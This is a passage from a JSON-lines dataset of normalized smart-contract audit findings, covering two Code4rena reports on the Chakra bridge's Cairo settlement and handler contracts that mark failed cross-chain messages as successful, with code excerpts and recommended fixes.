"github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-166", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 166, "page_start": null, "title": "settlement.cairo doesn't process callback correctly leading to CrossChainMsgStatus marked as SUCCESS even if it failed on destination chain", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L420\n\n\n# Vulnerability details\n\n## Impact\n`settlement.cairo` doesn't process callback correctly, leading to `CrossChainMsgStatus` marked as `SUCCESS` even if it failed on the destination chain.\n\n## Proof of Concept\nWhen a cross-chain message is sent it can return a callback with status `FAILED` or `SUCCESS`. The problem is that even if the cross-chain message failed, the original message status on the source chain would be marked as `SUCCESS`.\n\nLet's take a look at the `receive_cross_chain_callback` function on the `settlement.cairo` contract, and more specifically the part that updates the status:\n```\nfn receive_cross_chain_callback(\n            ref self: ContractState,\n            cross_chain_msg_id: felt252,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            cross_chain_msg_status: u8, <--\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n        ) -> bool {\n//other functionality\n\nlet success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\n            let mut state = CrossChainMsgStatus::PENDING;\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n            }else{\n                state = CrossChainMsgStatus::FAILED;\n            }\n\n            self.created_tx.write(cross_chain_msg_id, CreatedTx{\n                tx_id:cross_chain_msg_id,\n                tx_status:state, <--- update the status\n                from_chain: to_chain,\n                to_chain: from_chain,\n                from_handler: to_handler,\n                to_handler: from_handler\n            });\n```\nThe problem is that as long as the call to `handler.receive_cross_chain_callback` function was successful, the message as a whole will be marked in a `SUCCESS` state even though that `cross_chain_msg_status` could be SUCCESS or FAILED depending on if the message failed on the destination chain.\n\nThis could lead to a situation where a message fails to get processed on the destination chain, a callback is returned with `cross_chain_msg_status == FAILED` but the message is marked as `SUCCESS`.\n\nThat situation could be a user trying to bridge his tokens, the bridging fails so he doesn't receive his tokens on the destination chain, a callback is made and the message is marked as a `SUCCESS` even though it as not successfully executed.\n\nAnd if we see the code of the `handler.receive_cross_chain_callback` function, we'll see that it'd always return true as long as it doesn't revert:\n```\n        fn receive_cross_chain_callback(\n            ref self: ContractState,\n            cross_chain_msg_id: felt252,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            cross_chain_msg_status: u8\n        ) -> bool{\n\n            assert(to_handler == get_contract_address(),'error to_handler');\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n\n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n                tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe function just performs validation of the handlers, if the settlement contract calls it and returns true. These validation could all be true but the initial message could still be with a FAILED status.\n\nThis is not taken into account and could lead to a failed message being marked as a successful one.\n\nThe implementation on the solidity contract is correct:\n```\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status; <---\n\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\nAs you can see, even if the call to the handler was successful, the status is updated with the `CrossChainMsgStatus` that was passed to the function and it is not automatically marked with `SUCCESS`.\n\nThis should be the case in the cairo function as well but right now the `cross_chain_msg_status` parameter is ignored.\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nChange this line from this:\n```\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n```\nto this:\n```\n            if success{\n                state = cross_chain_msg_status;\n```\nTo be consistent with the solidity implementation.\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\n`settlement.cairo` doesn't process callback correctly, leading to `CrossChainMsgStatus` marked as `SUCCESS` even if it failed on the destination chain.\n", "recommendation_md": "## Recommended Mitigation Steps\nChange this line from this:\n```\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n```\nto this:\n```\n            if success{\n                state = cross_chain_msg_status;\n```\nTo be consistent with the solidity implementation.\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nWhen a cross-chain message is sent it can return a callback with status `FAILED` or `SUCCESS`. The problem is that even if the cross-chain message failed, the original message status on the source chain would be marked as `SUCCESS`.\n\nLet's take a look at the `receive_cross_chain_callback` function on the `settlement.cairo` contract, and more specifically the part that updates the status:\n```\nfn receive_cross_chain_callback(\n            ref self: ContractState,\n            cross_chain_msg_id: felt252,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            cross_chain_msg_status: u8, <--\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n        ) -> bool {\n//other functionality\n\nlet success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\n            let mut state = CrossChainMsgStatus::PENDING;\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n            }else{\n                state = CrossChainMsgStatus::FAILED;\n            }\n\n            self.created_tx.write(cross_chain_msg_id, CreatedTx{\n                tx_id:cross_chain_msg_id,\n                tx_status:state, <--- update the status\n                from_chain: to_chain,\n                to_chain: from_chain,\n                from_handler: to_handler,\n                to_handler: from_handler\n            });\n```\nThe problem is that as long as the call to `handler.receive_cross_chain_callback` function was successful, the message as a whole will be marked in a `SUCCESS` state even though that `cross_chain_msg_status` could be SUCCESS or FAILED depending on if the message failed on the destination chain.\n\nThis could lead to a situation where a message fails to get processed on the destination chain, a callback is returned with `cross_chain_msg_status == FAILED` but the message is marked as `SUCCESS`.\n\nThat situation could be a user trying to bridge his tokens, the bridging fails so he doesn't receive his tokens on the destination chain, a callback is made and the message is marked as a `SUCCESS` even though it as not successfully executed.\n\nAnd if we see the code of the `handler.receive_cross_chain_callback` function, we'll see that it'd always return true as long as it doesn't revert:\n```\n        fn receive_cross_chain_callback(\n            ref self: ContractState,\n            cross_chain_msg_id: felt252,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            cross_chain_msg_status: u8\n        ) -> bool{\n\n            assert(to_handler == get_contract_address(),'error to_handler');\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n\n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n                tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe function just performs validation of the handlers, if the settlement contract calls it and returns true. These validation could all be true but the initial message could still be with a FAILED status.\n\nThis is not taken into account and could lead to a failed message being marked as a successful one.\n\nThe implementation on the solidity contract is correct:\n```\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status; <---\n\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\nAs you can see, even if the call to the handler was successful, the status is updated with the `CrossChainMsgStatus` that was passed to the function and it is not automatically marked with `SUCCESS`.\n\nThis should be the case in the cairo function as well but right now the `cross_chain_msg_status` parameter is ignored.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L420\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L420\n\n\n# Vulnerability details\n\n## Impact\n`settlement.cairo` doesn't process callback correctly, leading to `CrossChainMsgStatus` marked as `SUCCESS` even if it failed on the destination chain.\n\n## Proof of Concept\nWhen a cross-chain message is sent it can return a callback with status `FAILED` or `SUCCESS`. The problem is that even if the cross-chain message failed, the original message status on the source chain would be marked as `SUCCESS`.\n\nLet's take a look at the `receive_cross_chain_callback` function on the `settlement.cairo` contract, and more specifically the part that updates the status:\n```\nfn receive_cross_chain_callback(\n            ref self: ContractState,\n            cross_chain_msg_id: felt252,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            cross_chain_msg_status: u8, <--\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n        ) -> bool {\n//other functionality\n\nlet success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\n            let mut state = CrossChainMsgStatus::PENDING;\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n            }else{\n                state = CrossChainMsgStatus::FAILED;\n            }\n\n            self.created_tx.write(cross_chain_msg_id, CreatedTx{\n                tx_id:cross_chain_msg_id,\n                tx_status:state, <--- update the status\n                from_chain: to_chain,\n                to_chain: from_chain,\n                from_handler: to_handler,\n                to_handler: from_handler\n            });\n```\nThe problem is that as long as the call to `handler.receive_cross_chain_callback` function was successful, the message as a whole will be marked in a `SUCCESS` state even though that `cross_chain_msg_status` could be SUCCESS or FAILED depending on if the message failed on the destination chain.\n\nThis could lead to a situation where a message fails to get processed on the destination chain, a callback is returned with `cross_chain_msg_status == FAILED` but the message is marked as `SUCCESS`.\n\nThat situation could be a user trying to bridge his tokens, the bridging fails so he doesn't receive his tokens on the destination chain, a callback is made and the message is marked as a `SUCCESS` even though it as not successfully executed.\n\nAnd if we see the code of the `handler.receive_cross_chain_callback` function, we'll see that it'd always return true as long as it doesn't revert:\n```\n        fn receive_cross_chain_callback(\n            ref self: ContractState,\n            cross_chain_msg_id: felt252,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            cross_chain_msg_status: u8\n        ) -> bool{\n\n            assert(to_handler == get_contract_address(),'error to_handler');\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n\n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n                tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe function just performs validation of the handlers, if the settlement contract calls it and returns true. These validation could all be true but the initial message could still be with a FAILED status.\n\nThis is not taken into account and could lead to a failed message being marked as a successful one.\n\nThe implementation on the solidity contract is correct:\n```\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status; <---\n\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\nAs you can see, even if the call to the handler was successful, the status is updated with the `CrossChainMsgStatus` that was passed to the function and it is not automatically marked with `SUCCESS`.\n\nThis should be the case in the cairo function as well but right now the `cross_chain_msg_status` parameter is ignored.\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nChange this line from this:\n```\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n```\nto this:\n```\n            if success{\n                state = cross_chain_msg_status;\n```\nTo be consistent with the solidity implementation.\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L420\n\n\n# Vulnerability details\n\n## Impact\n`settlement.cairo` doesn't process callback correctly, leading to `CrossChainMsgStatus` marked as `SUCCESS` even if it failed on the destination chain.\n\n## Proof of Concept\nWhen a cross-chain message is sent it can return a callback with status `FAILED` or `SUCCESS`. The problem is that even if the cross-chain message failed, the original message status on the source chain would be marked as `SUCCESS`.\n\nLet's take a look at the `receive_cross_chain_callback` function on the `settlement.cairo` contract, and more specifically the part that updates the status:\n```\nfn receive_cross_chain_callback(\n            ref self: ContractState,\n            cross_chain_msg_id: felt252,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            cross_chain_msg_status: u8, <--\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n        ) -> bool {\n//other functionality\n\nlet success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\n            let mut state = CrossChainMsgStatus::PENDING;\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n            }else{\n                state = CrossChainMsgStatus::FAILED;\n            }\n\n            self.created_tx.write(cross_chain_msg_id, CreatedTx{\n                tx_id:cross_chain_msg_id,\n                tx_status:state, <--- update the status \n                from_chain: to_chain,\n                to_chain: from_chain,\n                from_handler: to_handler,\n                to_handler: from_handler\n            });\n```\nThe problem is that as long as the call to `handler.receive_cross_chain_callback` function was successful, the message as a whole will be marked in a `SUCCESS` state even though that `cross_chain_msg_status` could be SUCCESS or FAILED depending on if the message failed on the destination chain. \n\nThis could lead to a situation where a message fails to get processed on the destination chain, a callback is returned with `cross_chain_msg_status == FAILED` but the message is marked as `SUCCESS`. \n\nThat situation could be a user trying to bridge his tokens, the bridging fails so he doesn't receive his tokens on the destination chain, a callback is made and the message is marked as a `SUCCESS` even though it as not successfully executed.\n\nAnd if we see the code of the `handler.receive_cross_chain_callback` function, we'll see that it'd always return true as long as it doesn't revert:\n```\n        fn receive_cross_chain_callback(\n            ref self: ContractState, \n            cross_chain_msg_id: felt252, \n            from_chain: felt252, \n            to_chain: felt252,\n            from_handler: u256, \n            to_handler: ContractAddress, \n            cross_chain_msg_status: u8 \n        ) -> bool{\n\n            assert(to_handler == get_contract_address(),'error to_handler');\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n            \n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n                tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe function just performs validation of the handlers, if the settlement contract calls it and returns true. These validation could all be true but the initial message could still be with a FAILED status.\n\nThis is not taken into account and could lead to a failed message being marked as a successful one.\n\nThe implementation on the solidity contract is correct:\n```\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback( \n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status; <---\n        \n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\nAs you can see, even if the call to the handler was successful, the status is updated with the `CrossChainMsgStatus` that was passed to the function and it is not automatically marked with `SUCCESS`.\n\nThis should be the case in the cairo function as well but right now the `cross_chain_msg_status` parameter is ignored.\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nChange this line from this:\n```\n            if success{\n                state = CrossChainMsgStatus::SUCCESS;\n```\nto this:\n```\n            if success{\n                state = cross_chain_msg_status;\n```\nTo be consistent with the solidity implementation.\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-167", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 167, "page_start": null, "title": "In settlement.cairo::receive_cross_chain_msg - the message will always be marked with Status::SUCCESS", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L356\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L135\n\n\n# Vulnerability details\n\n## Impact\nWhen receiving a message via the `settlement.cairo::receive_cross_chain_msg()` function, a call is made to `handler.receive_cross_chain_msg` and the return value of that call is used to mark the message with status `SUCCESS` or `FAILED`\n\nHowever, the way that the `handler.receive_cross_chain_msg` function is implemented, it'll always return true, therefore marking every message as successful even if the message for some reason was a corrupted one.\n\nAnd breaking one of the main invariants that states the message statuses should be tracked correctly.\n## Proof of Concept\nLet's take a look at the code of the `receive_cross_chain_msg` function on the settlement.cairo contract, and specifically at the part where the call to `handler.receive_cross_chain_msg` is made:\n```\nfn receive_cross_chain_msg(/*params*/) -> bool {\n//rest of the code\n\nlet success = handler.receive_cross_chain_msg(\n                cross_chain_msg_id,\n                from_chain, //from_chain\n                to_chain,  //to_chain\n                from_handler, //from_handler\n                to_handler , //to_handler\n                payload     //payload\n            );\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n}\n```\nAs you can see, the status of the messages is based on the return value of this line: `success = handler.receive_cross_chain_msg`.\n\nLet's see the `handler.receive_cross_chain_msg` function:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            payload: Array<u8>\n            ) -> bool{\n\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))),\n                    'not support handler');\n                    //i.e (from_chain, to_handler)\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n\n            let payload_transfer = message.payload;\n\n            let transfer = decode_transfer(payload_transfer);\n\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n\n            // Handle the cross-chain transfer according to the settlement mode set in the contract.\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\nAs you can see, as long as the function doesn't revert, it'll always return `true`.\n\nThis shouldn't be the case and if for some reason the message is a corrupted one, it should get marked as `FAILED` as intended by the protocol.\n\nThe functionality is correctly implemented in the solidity version:\n```\nfunction receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nImplement the functionality like in the solidity handler function so it returns `false` if something goes wrong.\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nWhen receiving a message via the `settlement.cairo::receive_cross_chain_msg()` function, a call is made to `handler.receive_cross_chain_msg` and the return value of that call is used to mark the message with status `SUCCESS` or `FAILED`\n\nHowever, the way that the `handler.receive_cross_chain_msg` function is implemented, it'll always return true, therefore marking every message as successful even if the message for some reason was a corrupted one.\n\nAnd breaking one of the main invariants that states the message statuses should be tracked correctly.\n", "recommendation_md": "## Recommended Mitigation Steps\nImplement the functionality like in the solidity handler function so it returns `false` if something goes wrong.\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nLet's take a look at the code of the `receive_cross_chain_msg` function on the settlement.cairo contract, and specifically at the part where the call to `handler.receive_cross_chain_msg` is made:\n```\nfn receive_cross_chain_msg(/*params*/) -> bool {\n//rest of the code\n\nlet success = handler.receive_cross_chain_msg(\n                cross_chain_msg_id,\n                from_chain, //from_chain\n                to_chain,  //to_chain\n                from_handler, //from_handler\n                to_handler , //to_handler\n                payload     //payload\n            );\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n}\n```\nAs you can see, the status of the messages is based on the return value of this line: `success = handler.receive_cross_chain_msg`.\n\nLet's see the `handler.receive_cross_chain_msg` function:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            payload: Array<u8>\n            ) -> bool{\n\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))),\n                    'not support handler');\n                    //i.e (from_chain, to_handler)\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n\n            let payload_transfer = message.payload;\n\n            let transfer = decode_transfer(payload_transfer);\n\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n\n            // Handle the cross-chain transfer according to the settlement mode set in the contract.\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\nAs you can see, as long as the function doesn't revert, it'll always return `true`.\n\nThis shouldn't be the case and if for some reason the message is a corrupted one, it should get marked as `FAILED` as intended by the protocol.\n\nThe functionality is correctly implemented in the solidity version:\n```\nfunction receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == 